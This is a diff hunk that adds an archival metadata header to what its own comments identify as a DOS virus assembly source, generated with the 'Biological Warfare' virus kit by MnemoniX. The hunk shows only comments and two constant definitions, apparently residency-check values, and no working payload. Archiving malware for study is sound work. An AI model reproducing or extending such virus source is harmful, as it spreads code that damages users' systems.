@@ -1,5 +1,16 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; AH.asm : Mess with White Shark and you'll be eaten alive!
-; Created with Biological Warfare - Version 0.90� by MnemoniX
+; Created with Biological Warfare - Version 0.90� by MnemoniX
 
 PING            equ     0AE8Eh
 PONG            equ     0A09Eh
